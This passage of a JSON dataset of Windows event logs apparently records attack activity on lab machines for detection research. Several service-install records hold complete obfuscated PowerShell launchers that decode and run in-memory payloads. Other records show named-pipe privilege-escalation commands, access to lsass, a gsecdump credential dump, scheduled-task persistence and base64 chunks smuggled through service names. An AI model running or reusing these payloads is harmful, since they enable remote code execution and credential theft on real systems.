      "ImagePath": "%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -c if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIADhM4FcCA7VWbW/aSBD+nEr9D1aFhK0QbAhtmkiVbm1ew0sABwhQVG3stVlYex17zVuv//3GgBt6Te7ak85KxK5nZvfZZ57ZsRP7lqDcl4K7JpK+vn1z1sUh9iQ54w7q7PbLIidl1p62iJWzMzBm5pVF8XZXiQfSJ0meoiAocw9Tf3ZzY8RhSHxxmOdrRKAoIt4joySSFelPaTQnIbm4e1wQS0hfpcyXfI3xR8yOblsDW3MiXSDfTmwtbuEEV94MGBVy9vPnrDK9KMzylacYs0jOmttIEC9vM5ZVpG9KsuH9NiBytk2tkEfcEfkR9S+L+YEfYYd0YLUVaRMx53aUVeAo8BcSEYe+9HyoZJWDj5yFYTfkFrLtkEQQkm/4K74kcsaPGctJf8jTI4R+7AvqEbALEvLAJOGKWiTK17FvM9InzkzukHV68l8Nkk+DwKsrQiUHaXkNa5vbMSOH8KzyM9o0nwo833MKPHx7++btGydVAQ4871QFMDqb7scEcMpdHtG93ydJy0lt2AwLHm5hmrkPY6LMpGmShOlsJmWCUjv3engh9QVPYneDDbybDjm1ZxBzTE/maT4ePyyjxPS60srEoT4pb33sUSsVk/wS5cRhZH/MfOrWAWBy9mggdpkw4mKR8JeTpj+HVTwqvsfqMWU2CZEFaYsAFWRU+RHMISVytuG3iQc0HeZZYN8BCZPU+yjbbbp7MgenrMFwFOWkbgw1ZOUkk2BG7JyE/IgeTSgWfD/MPsNtx0xQC0ciXW6mnFB53NLgfiTC2ILkwfHvzYBYFLOEjZxUpzbRtyZ1062zL3JhYMao78JKK8gFvEk4MEUiiRBQJulX8iYRDS9gxAOXfTlXGXaheI/q30sIu8TOvoAx1fZByAkhKRMnCCHLJuMiJw1pKOBiSMjdy+k/ITi5ElIsRkiOKZHTYpnqW5FIPLPQ2h+HYb9hrC4TiR452jMSCmCjGnJPxxH5UDJFCFzJ79Q7aiB4xg2ftS19SQtoTQuNNvwP6GWDl6/s5u2iroblzdxBjajRrnfLvXq9tLo1hyVhVhqi2W2IduVhsTBRvT8Yi0kD1e+pthyXdsEt3ZktZI836oedvltr+ma3cG1nXHYc98ox+4X3VdoaGT1dK+JWuRK3Rvpa10pRha7rPTroLW+r4nE8ZHjgqO5D4RrTTStcDAu8vWsgVJtfWrtbZ1ibt+3tuK5ej0pLVEHI8CvDqs6bYz1EXXWI3SFfNxc1NnINpI/OKZn0BlW916vqaFBbPJWvVRdiH/BcHw2LdBI89OcwrwKEpqqVGjbZ8XEPSKpxhN0++LhG0Zo74FM+R/p5h0dFvNQ50sGnOnkCXOOg2mVgvx8UORqyzgNGrcm2qqqFcbeE6hod1VyULIldvYdRtCrvymphaHN79L4zdtThA7tSy8Z9YDmqqq7r5aY1KWw+3l2VdO3J8KjHHou2ej34qPvrpttduXZvdNXfdLaPsN9AVYfvEvWAfDIu89Zm9f7uy3ZyIonXLvs2DqM5ZiAVuMDTeq3ysHq8jrucJhGyvG/OSxL6hEFHg56X6h0xxq2kL+wvbuhJh04xg5IdwPCy+OJIkb47Ks+tIn11czMBlFBAJ/rOt4jvinlO21xqGlz92qakwZl//YAGD7by6Yq5pIOc8vW3Ddl+QyUpuExgfcBGfL34fyk9lvocfux/o/T53T9Yf4lmLfcDCT9Zf3zxW5z/NgMjTAV4mnBXMXJoni8TcZTRyWdGmiJQiHN8ko++u1hcdOAL5C8TptLHZwoAAA==''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);"
    }
  },
  "104512": {
    "event_id": 7045,
    "channel": "System",
    "provider_name": "Service Control Manager",
    "computer": "IE10Win7",
    "timestamp": "2016-09-19T20:38:04.034140Z",
    "event_data": {
      "ServiceName": "DrzkXznQhkKgYssd",
      "ImagePath": "%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -c if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAKtM4FcCA71WbW/aSBD+3Er9D1aFhK0SDIQmTaRKt8YYCC8BHMxb0Wljr+2FxUvsdXjp9b/fGHBCrs0p1w9nJWLXM7P77DPP7NiNA1tQHkjr7Xy3qDfHSPr+4f27Lg7xUpIzD3VrxLSclFkX726swVp59w6sGda0R60/g60ufZXkKVqtdL7ENJhdX1fiMCSBOMzzNSJQFJHlPaMkkhXpL2nok5Cc3d7PiS2k71Lmz3yN8XvMjm7bCrZ9Ip2hwElsLW7jBF3eXDEq5Oy3b1llelac5asPMWaRnDW3kSDLvMNYVpF+KMmGd9sVkbNtaoc84q7ID2lwXsoPggi7pAOrPZI2ET53oqwCR4G/kIg4DKTnQyWrHHzkLAy7IbeR44QkgpB8I3jkCyJngpixnPSHPD1C6MeBoEsCdkFCvjJJ+EhtEuXrOHAY6RN3JnfIOj35W4Pk0yDw6opQyUFeXsPa5k7MyCE8q/yM9phQBZ6TpAIRPz68//DeTcUQ+3HR76L+qRZg9G66HxMAK3d5RPe+X6VCTmrDjljwcAvTzF0YE2UmTZNMTGczKYMnZu718GLqC56udlmDV1OLU2cGIccUZSK/tlt8CTbuTTUxv644nbg0IPo2wEtqp6KSf0U9cRnZnzafunUAm5w9GoijE0Y8LBIec9L057DqkoqnWC2mzCEhsiF9EaCCzCovwRxSI2cbQZssganDPAtpcEHKJPU+yneb7p7MwSlbYTiKclI3hlqyc5JJMCNOTkJBRI8mFAu+H2af4bZjJqiNI5EuN1P+Qedx2woPIhHGNuQQKLgzV8SmmCWM5KQ6dYi2NamXbp/9JR8VzBgNPFjpEfIBbxIeTJEoIwSkiQqUvElEY7liZAku+9I2GPagkI+VsFcS9oiTfQVnqvWDsBNiUkZOUEK2TcZFTrJoKOCi2JMMyvotECc3xCmcSkiO2ZHT8plqW5EIPvNwEbkjY3PbTbR6JGpPSyiAEiPkSw1H5KJsihAIkz+qt7SC4Bk3Ata2tQUtojUtNtrwP6DnDa5fOs2beV0N9Y3vokbUaNe7eq9eLz/emFZZmNWGaHYbol0dzecmqvcHYzFpoPodLSzG5d3qhu7MFnLGG/Vip+3WBW2zm3uOO9Zd17t0zX7xs0Fbw0pPK5RwS6/GraG21grlqErX9R4d9BY3hrgfWwwPXNUbFa8w3bTCuVXk7V0DoZp/bu9uXKvmt53tuK5eDcsLVEWoElQtQ+PNsRairmphz+Lr5rzGhl4FaYZNyaQ3MLRez9DQoDZ/0K9UD2JH2NeGVolOVqO+D3MDIDTVQrnhkB0f94CkGkfY64OPVynZvgs++iekferwqIQXGkca+BiTB8A1XhldBva7QYkji3VGGLUmW0NVi+NuGdULdFjzULIk9rQeRtGjvtPVouVwZ/i5M3ZVuCkvVb1yt7JdVVXXdb1pT4qbL7eXZa3wUFnSJbsvOerV4IsWrJte99FzesPL/qazvYf9BqpqfUz0AwLKiF2r3LjCV1E1PJHEa7d/G4eRjxlIBW70tHANHhrH67nLaRIhy889e0HCgDDoc9AJU9UjxriddIun2xy61aGHzKCABzA8L/1ypEhPjspzE0lfXV9PAC7U0pPM8y0SeMLPFTbnhQJ0g8KmXICjv/2cFb7ays/r5ZKWckrai83YfjMlqbgM3/Xsi0t+rv8PtB4r3ocf5y20Pr/7F+ubqC7kXpDxk/Xli//E/O9RMcRUgLsJtxcjh776OiNHTZ18jTxlDRTjHp/k4/A2Fmcd+FL5G8KtLTuVCgAA''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);"
    }
  },
  "104513": {
    "event_id": 7045,
    "channel": "System",
    "provider_name": "Service Control Manager",
    "computer": "IE10Win7",
    "timestamp": "2016-09-19T20:59:41.659140Z",
    "event_data": {
      "ServiceName": "TDhDnlnsrKrQVnjY",
      "ImagePath": "%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -c if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIALxR4FcCA7VWf2/aSBD9O5X6HawKCVslGAhpmkiVbo0xEDABHCCGotPGXpuFxUvs5Wev3/3GYDdUTar0pLMSseuZ2X375s2OvVXgCMoDaYltQ/r2/t1ZB4d4IckZl667NmZ2Tsp4wa7aLClnZ2DOrM1OoNXYcqTXpC+SPEbLpc4XmAaTm5vKKgxJII7zfI0IFEVk8cgoiWRF+kcaTklIzu8eZ8QR0jcp83e+xvgjZonbroKdKZHOUeDGthZ3cIwtby0ZFXL269esMj4vTvLVpxVmkZy1dpEgi7zLWFaRvivxhve7JZGzJnVCHnFP5Ic0uCjl+0GEPdKG1dbEJGLK3SirwGHgLyRiFQbS6bHidY5echaGnZA7yHVDEkFQvhGs+ZzImWDFWE76Sx4nIHqrQNAFAbsgIV9aJFxTh0T5Og5cRnrEm8htsknP/tYg+TQIvDoiVHKQnNfRmtxdMXJcIKv8ivdHXhV4nnMLbHx//+79Oy/VQ3TZs4K/69v1qShgdDY+jAkAljs8ogfnL1IhJ5mwJxY83ME0cx+uiDKRxnE+xpOJlGHuZTn3enwxdQbXPbl4uIR34wGn7gRiklRlvO4wWG/KmMbG13WnE48GRN8FeEGdVFryS/QTj5HDcfOpWxugydnEQFydMOJjETOZk8a/hlUXVPyI1VaUuSREDqQwAlSQXeVnMMfkyNlGYJIFMHWcZ+M0gKBJ6p2IeJfuHs/BKVthOIpyUmcFFeXkJItgRtychIKIJia0EvwwzD7DNVdMUAdHIl1uovxEZrJphQeRCFcOZBAIuLeWxKGYxXzkpDp1ibazqJ9unn2RjQpmjAY+rLSGbMCbmAVLxLoIAedBA0reIqKxWDKyAJ9DfRsM+1DNSTEchIR94mZfhJlK/ajrmJWUjhOQkGqLcZGTBjQUcFfEDB9U9d9AnFwTz3AqIUlSI6fFM9Z2IlZ7ZtrdOsOeE8s0YenASSiADyPkCw1H5FPZEiGwJX9Q72gFwWM3AmY62pwW0YYWGyb89+lFg+tXbvN2VldDfTv1UCNqmPWO3q3Xy+tba1AWVrUhmp2GMKsPs5mF6r2+LUYNVL+nhbld3i9v6d5qIdfeqp/22n5T0Lb7me96tu55/pVn9YqXBm0NK12tUMItvbpqDbWNVihHVbqpd2m/O781xKM9YLjvqf5D8RrTbSucDYrc3DcQqk0vnP2tN6hNTXdn19XrYXmOqghVgurA0HjT1kLUUQfYH/BNc1ZjQ7+CNMOhZNTtG1q3a2ioX5s96deqD7EPeKoNByU6Wj70pjA3AEJTLZQbLtlzuwsk1TjCfg98/ErJmXrgo39E2sc2j0p4rnGkgY8xegJc9tLoMLDf90scDVj7AaPWaGeoatHulFG9QIc1H8VLYl/rYhSt9b2uFgcud4eXbdtTBw/sStUr90vHU1V1U9ebzqi4/Xx3VdYKT5UFXbDHkqte9z9rwabpd9a+2x1e9bbt3SPs11fVwYdYOyCezGJ2vTSvTtTw2r1v4jCaYgYqgZs8LVeDh0ZyK3c4jSNk+dCt5yQMCIP2Bg0wVTpijDtxi3i+v6FHHTvHBIq2D8OL0osjRfrhqDw3jvTVzc0IoEL9JNrOt0jgi2musL0oFOD2L2zLBTjv209Y4cudnK6WixtIwtPJHuywhxLXVsaf96In1Pp/WUyKego/7ptYfH73G+ubmC3k0vP/Yvj5xR+x/McMDDEV4GnBzcTIsV3+hohEOSffGUmaQBde8sQffncrcd6GL5B/AQG25GNvCgAA''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);"
    }
  },
  "104514": {
    "event_id": 7045,
    "channel": "System",
    "provider_name": "Service Control Manager",
    "computer": "IE10Win7",
    "timestamp": "2016-09-19T21:12:10.677695Z",
    "event_data": {
      "ServiceName": "adsymn",
      "ImagePath": "cmd.exe /c echo adsymn > \\\\.\\pipe\\adsymn"
    }
  },
  "104515": {
    "event_id": 7045,
    "channel": "System",
    "provider_name": "Service Control Manager",
    "computer": "IE10Win7",
    "timestamp": "2016-09-19T21:13:04.090781Z",
    "event_data": {
      "ServiceName": "hmoopk",
      "ImagePath": "cmd.exe /c echo hmoopk > \\\\.\\pipe\\hmoopk"
    }
  },
  "104516": {
    "event_id": 7045,
    "channel": "System",
    "provider_name": "Service Control Manager",
    "computer": "IE10Win7",
    "timestamp": "2016-09-19T21:23:37.125937Z",
    "event_data": {
      "ServiceName": "aCshIvAdgRYNApEv",
      "ImagePath": "%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -c if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAFhX4FcCA71WbW/aSBD+nEr9D1aFhK06GAgpTaRKZwMGEkwAB/NWVG3stVlYvMRe89brf78x2Alpm1PuTjoL5N2dmZ3ZZ57ZsRv5NifMF8JS5PbH1o4I39+/O+ugAC0FMbMqtL2NLGR2YRiRzXLtDD3p7AwUMkHppjMozUbl/lr4IogTdbWqsiUi/vT6uhIFAfb5cZ6rY66GIV4+UIJDURL+FAYzHODzu4c5trnwXch8y9Upe0A0UdtVkD3DwrnqO7GsxWwUh5gzV5RwMfv1a1aanBemudpjhGgoZs1dyPEy51CalYQfUuzwfrfCYtYgdsBC5vLcgPgXxVzfD5GL27DbGhuYz5gTZiU4DPwCzKPAF06PFe9z1BKzMOwEzFYdJ8AhGOWa/potsJjxI0pl4Q9xkgTRi3xOlhjkHAdsZeJgTWwc5hrIdyjuYXcqtvEmPftbjcRTI9Dq8ECSIT2vR2swJ6L4uEFW+jXeY2YleH7KLuDx4/279+/clBjOPuw442HxlBcwOpscxhgiFjssJAfdL0JeFgxwijgLdjDN3AcRlqbCJE7IZDoFX/rF2Kk5V/pwKb++TSG1AQu/uPs8tIdG+I2CZGIx4kzBMklcZlbuGfH66wSsYpf4uLrz0ZLYKcfE3+UBuxQfTp1L1doQm5hNBNipYoo9xGNIZWHyq1ltSfiTrRYR6uBAtSGXIUQFaZZeBnPMkpht+gZeAmLHeRZS4gKzcaqdsHmXeo/noJStUBSGstCJoLRsWTAxotiRBdUPSSJSI84Ow+xzuEZEObFRyNPtplKKY+KvwvyQB5ENSYSz35srbBNEYyhkoUEcrO1M4qV+s78FooIoJb4HO60hEbASA2DymBqBI7+ggZQzMW8uVxQvQfVQ6jpFHhR2UhcHSiEPO9mfA00Jf2R3DEmKxUmYkGeTMi4LFgk43BgxvCec+k/BnNwch7AqAU7yI6aFNNF2PKZ+Jrpc9Kxi+T4mawLYAZ6AAzR6wJYaCvGnkskDAE78oNyRigrPqOlTw9YWpKBuSKFpwL9PLpqsWnZub+YNJahuZ67aDJtGo1PtNhql9Y1plbhZa/LbTpMbteF8bqqNXn/Ex021cU/yi1Fpv7ohe7OlOqOt8mmv7Td5bbufe447qrquV3bNXuFSJ61Bpavli6hVrUWtgbbR8qWwRjaNLul3Fzc6fxhZFPVdxRsWrhDZtoK5VWDGvqmq9dmFvb9xrfrMcHajhnI1KC3UmqpW/Jqla+x2pAVqR7GQZ7HN7bxOB15F1XSb4HG3r2vdrq6p/fr8sXqleGA7RDNtYBXJeDXszWCuQwi3Sr7UdPCejboAUp2pyOuBjlcp2jMXdKofVe1jm4VFtNCYqoGOPn6EuEYrvUNBft8vMtWi7SFSW+OdriiFUaekNvJkUPfUeEvkaV2khuvqvqoULIc5g8v2yFWsIS0r1cr9ynYVRdk0qrf2uLD9fFcuafnHypIs6UPRUa76nzV/c+t11p7THZR72/buAfz1FcX6EPMGiJPxN4WCfdcr07vo4oQTrzUDAwXhDFHgClzvaenqLNCTi7rDSGwhis+dfIEDH1NofNAaU/arlDI7bh5P9zo0r2NLmUIl92F4UfztSBKeFKXnjpIuXV+PIVwoppTmuRb2PT6T89uLfB7aQn5bysPR337MClvtxKft5Li1vMDs1Bc9+JLiess8eI+PtUrzf4A0qfYZvJy3QPq89jfSN8Gcl19C8Yv45cI/wv3fYTFAhIO6CXcXxce2+jokCaFOvkuSpAFb3OSJPxTvIn7ehi+WvwCZDrcJpgoAAA==''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);"
    }
  },
  "104517": {
    "event_id": 7045,
    "channel": "System",
    "provider_name": "Service Control Manager",
    "computer": "IE10Win7",
    "timestamp": "2016-09-21T03:41:13.070312Z",
    "event_data": {
      "ServiceName": "hgabms",
      "ImagePath": "cmd.exe /c echo hgabms > \\\\.\\pipe\\hgabms"
    }
  },
  "104518": {
    "event_id": 7045,
    "channel": "System",
    "provider_name": "Service Control Manager",
    "computer": "IE10Win7",
    "timestamp": "2016-09-20T16:35:46.590820Z",
    "event_data": {
      "ServiceName": "UWdKhYTIQWWJxHfx",
      "ImagePath": "%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -c if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAGFl4VcCA71WW4/aOhB+bqX+h6hCIlFZEli6N6nScYAAy2Vhw52iI5M4weDEbOJw6+l/PxMge2m31Z4+nAgU2zPjGX/zjSdO5FuCcl+aF8YW77iE9KRvH96/a+MAe5Kcmq0rV5uutY5mopKRUq6rcU625Yd6V3n3DvRS++uRJ32R5AlarUrcw9Sf3twUoyAgvjjOsxUiUBgSb8YoCWVF+kcazElAzu5mC2IJ6ZuU+jtbYXyG2UltV8TWnEhnyLdjWYNbOI4xa64YFXL669e0MjnLTbPlhwizUE6bu1AQL2szllak70rssLtbETndpFbAQ+6I7ID65/lszw+xQ1qw25o0iZhzO0wrcAr4BUREgS8dzhNvcBTLaRi2A24h2w5ICNrZmr/mSyKn/IixjPSXPDl5v498QT0CckECvjJJsKYWCbNV7NuM3BNnKrfIJjn0W43k50ag1RaBkoG8vBJmk9sRI0fLtPJzoC9yqcDzQz4BiO8f3n947ySU8C6CVWtPLxcbhJ+TAkbvJocxgajlNg/pQf+LpGWkJvjHggc7mKa6QUSUqTSJszGZTqWUPeyagdjVM7/eI5cYgPreEMM1h8VJn1N7CkanbKUs9hB7+A3rSsShPintfOxRKyGW/FoOiMPI4cTZRK0FYcnpk4DYJcKIi0WMakaa/GxW9qh4tNUjymwSIAvyGEJUkGLlZTDHRMnpmt8kHiB1nKchHQ7QmSTaJwrvEu/xHJTSRYbDMCO1I6gnKyOZBDNiZyTkh/QkQpHgh2H6KdxmxAS1cCiS7aZKguPJX5H7oQgiC5IHZ++aK2JRzGIoMlKV2kTfmdRN/KZfBaKIGaO+CzutIRGwEgNgipgSAYT4mH4laxJR81aMeKB3KG6DYRdK+VQQBx5hl9jpH6NMCH9kd4xHAsSzGCHJJuMiI/VpIOCOiLE9cunPg3h2RxzCKQbklBQ5qZyJvhMxz1MMF+dHfp4wOiASCEDDCLin45BcFEwRAFbyR/WOFhE8o5rPmpa+pDm0oblaE/49el7jpUu7fruoqkFpO3dQLaw1q+1Sp1otrG/NfkGY5Zqot2uiWR4uFiaq3vdGYlxD1S7VlqPCfnVL92YD2aOterHX9xtN3+4Xru2MSo7jXjrmfe6zQRuDYkfX8rhRKkeNgb7RtUJYpptqh/Y6y1tDzEZ9hnuO6g5z15huG8Gin+PNfQ2hyvzc2t86/cq8ae9GVfV6UFiiMkJFv9w3dF4f6QFqq33s9vmmvqiwgVtEumFRMu70DL3TMXTUqyweSteqC7ZDPNcH/Twdr4b3c5gbEEJd1Qo1m+z5qAMgVTjC7j3ouMW8NXdAp/QJ6Z9aPMzjpc6RDjrG+AHiGq2MNgN5t5fnqM9aQ4wa452hqrlRu4CqGh1UXBRviV29g1G4Lu1Laq5vc3vwuTVy1P6QXaqlYndlOaqqbqqlujXOba/uLgu69lD0qMdmeVu97l3p/qbutteu3Rlc3m9buxn466lq/2PMGqBNavHZu9IuF8/o8Ktrv4mDcI4Z0ATu86RQDR4Ypyu5zWlsIcvPuvWSBD5h0Nyg/SV8R4xxK+4TL65w6FXHDjKF4u3B8Dz/6kiRHhWVpz6SLN3cjCFmqKMjybMN4rtintG255oG97+2LWhw8LeftMhXO/m0WSbuIAleTy7YwYUSl1hqMdg0L5bV1f+B5qnE5/Cy34rm09pvpG9CWMs8IvGT5OXCf8L7D7EYYCpA34Qri5FjA/09JCcuPfsQSVIHXHFOT/wxeBeJsxZ8o/wLs66tlosKAAA=''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);"
    }
  },
  "104519": {
    "event_id": 7045,
    "channel": "System",
    "provider_name": "Service Control Manager",
    "computer": "IE10Win7",
    "timestamp": "2016-09-20T16:35:58.162109Z",
    "event_data": {
      "ServiceName": "genusn",
      "ImagePath": "cmd.exe /c echo genusn > \\\\.\\pipe\\genusn"
    }
  },
  "112041": {
    "event_id": 7,
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "provider_name": "Microsoft-Windows-Sysmon",
    "computer": "PC-01.cybercat.local",
    "timestamp": "2021-11-18T07:42:55.711828Z",
    "event_data": {
      "Image": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe"
    }
  },
  "104898": {
    "event_id": 1,
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "provider_name": "Microsoft-Windows-Sysmon",
    "computer": "MSEDGEWIN10",
    "timestamp": "2020-10-23 21:57:36.399534+00:00",
    "event_data": {
      "CommandLine": "\"C:\\Windows\\System32\\cmd.exe\"  /C schtasks /Create /f /XML C:\\Users\\IEUser\\AppData\\Local\\Temp\\sduchxll.tmp /TN DataUsageHandlers"
    }
  },
  "108795": {
    "event_id": 10,
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "provider_name": "Microsoft-Windows-Sysmon",
    "computer": "MSEDGEWIN10",
    "timestamp": "2019-07-19 15:11:16.487989+00:00",
    "event_data": {
      "TargetImage": "C:\\Windows\\system32\\lsass.exe",
      "GrantedAccess": "0x00001010"
    }
  },
  "108796": {
    "event_id": 1,
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "provider_name": "Microsoft-Windows-Sysmon",
    "computer": "MSEDGEWIN10",
    "timestamp": "2019-07-19 15:11:16.986675+00:00",
    "event_data": {
      "CommandLine": "\"C:\\Windows\\system32\\cmd.exe\" /c \"gsecdump -a\""
    }
  },
  "108801": {
    "event_id": 10,
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "provider_name": "Microsoft-Windows-Sysmon",
    "computer": "IEWIN7",
    "timestamp": "2019-04-30 12:43:43.784178+00:00",
    "event_data": {
      "TargetImage": "C:\\Windows\\system32\\lsass.exe",
      "GrantedAccess": "0x001f1fff"
    }
  },
  "108803": {
    "event_id": 10,
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "provider_name": "Microsoft-Windows-Sysmon",
    "computer": "MSEDGEWIN10",
    "timestamp": "2021-04-22 22:09:25.417738+00:00",
    "event_data": {
      "TargetImage": "C:\\Windows\\system32\\lsass.exe",
      "GrantedAccess": "0x00001000"
    }
  },
  "108804": {
    "event_id": 10,
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "provider_name": "Microsoft-Windows-Sysmon",
    "computer": "MSEDGEWIN10",
    "timestamp": "2021-04-22 22:09:26.163584+00:00",
    "event_data": {
      "TargetImage": "C:\\Windows\\system32\\lsass.exe",
      "GrantedAccess": "0x00001410"
    }
  },
  "108805": {
    "event_id": 10,
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "provider_name": "Microsoft-Windows-Sysmon",
    "computer": "MSEDGEWIN10",
    "timestamp": "2021-04-22 22:09:26.163885+00:00",
    "event_data": {
      "TargetImage": "C:\\Windows\\system32\\lsass.exe",
      "GrantedAccess": "0x001fffff"
    }
  },
  "108810": {
    "event_id": 10,
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "provider_name": "Microsoft-Windows-Sysmon",
    "computer": "IEWIN7",
    "timestamp": "2019-05-02 14:50:17.955524+00:00",
    "event_data": {
      "TargetImage": "C:\\Windows\\system32\\lsass.exe",
      "GrantedAccess": "0x0000143a"
    }
  },
  "108811": {
    "event_id": 10,
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "provider_name": "Microsoft-Windows-Sysmon",
    "computer": "IEWIN7",
    "timestamp": "2019-05-11 18:10:42.637533+00:00",
    "event_data": {
      "TargetImage": "C:\\Windows\\system32\\lsass.exe",
      "GrantedAccess": "0x00101ffb"
    }
  },
  "104943": {
    "event_id": 7045,
    "channel": "System",
    "provider_name": "Service Control Manager",
    "computer": "FS03.offsec.lan",
    "timestamp": "2021-11-03 08:15:35.365023+00:00",
    "event_data": {
      "ServiceName": "dGVkIChTZWN1cml0eSwgQXBwbGljYXRpb24sIFN5c3RlbSkNCiNAcGFyYW0gJFJlbW90ZUNvbXB1dGVyIC0+ICBUaGUgdmFsdWUgdG8gdGVsbCBpZiB0aGUgY29tcHV0ZXIgaXMgcmVtb3RlIG9yIG",
      "ImagePath": "c:\\windows\\system32\\cmd.exe /c powershell -command \"Get-Service \"seg15\" | select -Expand DisplayName |out-file -append tmp_payload.txt\""
    }
  },
  "104944": {
    "event_id": 7045,
    "channel": "System",
    "provider_name": "Service Control Manager",
    "computer": "FS03.offsec.lan",
    "timestamp": "2021-11-03 08:15:35.365023+00:00",
    "event_data": {
      "ServiceName": "dGVkIChTZWN1cml0eSwgQXBwbGljYXRpb24sIFN5c3RlbSkNCiNAcGFyYW0gJFJlbW90ZUNvbXB1dGVyIC0+ICBUaGUgdmFsdWUgdG8gdGVsbCBpZiB0aGUgY29tcHV0ZXIgaXMgcmVtb3RlIG9yIG",
      "ImagePath": "c:\\windows\\system32\\cmd.exe /c powershell -command \"Get-Service \"seg15\" | select -Expand DisplayName |out-file -append tmp_payload.txt\""
    }
  },
  "105085": {
    "event_id": 7045,
    "channel": "System",
    "provider_name": "Service Control Manager",
    "computer": "FS03.offsec.lan",
    "timestamp": "2021-11-03 08:17:18.961132+00:00",
    "event_data": {
      "ServiceName": "xpc3QNCg0KI0BwYXJhbSAkTG9nTmFtZSAgICAgICAgICAgIC0+ICBUaGUgRXZlbnQgTG9nDQojQHBhcmFtICRBdmdFdmVudHNQZXJTZWNvbmQgLT4gIFRoZSBhdmcgZXZlbnRzIHBlciBzZWNvbmQg",
      "ImagePath": "c:\\windows\\system32\\cmd.exe /c powershell -command \"Get-Service \"seg86\" | select -Expand DisplayName |out-file -append tmp_payload.txt\""
    }
  },
  "105086": {
    "event_id": 7045,
    "channel": "System",
    "provider_name": "Service Control Manager",
    "computer": "FS03.offsec.lan",
    "timestamp": "2021-11-03 08:17:18.961132+00:00",
    "event_data": {
      "ServiceName": "xpc3QNCg0KI0BwYXJhbSAkTG9nTmFtZSAgICAgICAgICAgIC0+ICBUaGUgRXZlbnQgTG9nDQojQHBhcmFtICRBdmdFdmVudHNQZXJTZWNvbmQgLT4gIFRoZSBhdmcgZXZlbnRzIHBlciBzZWNvbmQg",
      "ImagePath": "c:\\windows\\system32\\cmd.exe /c powershell -command \"Get-Service \"seg86\" | select -Expand DisplayName |out-file -append tmp_payload.txt\""
    }
  },
  "105197": {
    "event_id": 7045,
    "channel": "System",
    "provider_name": "Service Control Manager",
    "computer": "FS03.offsec.lan",
    "timestamp": "2021-11-03 08:18:41.440752+00:00",
    "event_data": {
      "ServiceName": "ZW50c1BlclNlY29uZCAtPiAgVGhlIGF2ZyBldmVudHMgcGVyIHNlY29uZCBmb3IgdGhlIGdpdmVuIGxvZw0KI0BwYXJhbSAkVG90YWxMb2dFdmVudHMgICAgIC0+ICBUaGUgdG90YWwgIyBvZiBldm",
      "ImagePath": "c:\\windows\\system32\\cmd.exe /c powershell -command \"Get-Service \"seg143\" | select -Expand DisplayName |out-file -append tmp_payload.txt\""
    }
  },
  "105198": {
    "event_id": 7045,
    "channel": "System",
    "provider_name": "Service Control Manager",
    "computer": "FS03.offsec.lan",
